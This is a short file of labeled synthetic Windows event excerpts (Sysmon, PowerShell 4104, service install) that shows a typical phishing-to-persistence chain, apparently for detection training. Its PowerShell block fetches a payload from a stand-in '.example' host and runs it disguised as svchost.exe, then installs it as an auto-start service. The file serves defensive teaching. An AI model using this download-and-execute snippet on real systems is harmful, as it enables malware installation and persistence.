# Synthetic evidence excerpts

> These are illustrative fields, **not authentic exported Windows logs**. The timestamps, addresses, processes and names are fictitious. Actual Event XML fields vary by event/provider/configuration.

## Sysmon Event ID 1 — Process creation
```text
UtcTime: 2026-11-11 09:14:23.000
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
CommandLine: powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\update.ps1
User: CORP\ivan.petrov
```

## PowerShell Event ID 4104 — Script block
```powershell
$url = "https://cdn-system-updates.example/payload.exe"
$out = "C:\Users\Public\svchost.exe"
Invoke-WebRequest -Uri $url -OutFile $out
Start-Process -FilePath $out
```

## Service Control Manager Event ID 7045 — Service installation
```text
ServiceName: WindowsUpdateHelper
ImagePath: C:\Users\Public\svchost.exe
StartType: Auto Start
ServiceAccount: LocalSystem
```

## Sysmon Event ID 3 — Network connection
```text
Image: C:\Users\Public\svchost.exe
ProcessId: 4820
DestinationIp: 203.0.113.50
DestinationPort: 443
Protocol: tcp
Initiated: true
```

`203.0.113.50` belongs to TEST-NET-3 (RFC 5737); `.example` is a reserved example domain. Neither is presented as a real malicious indicator.
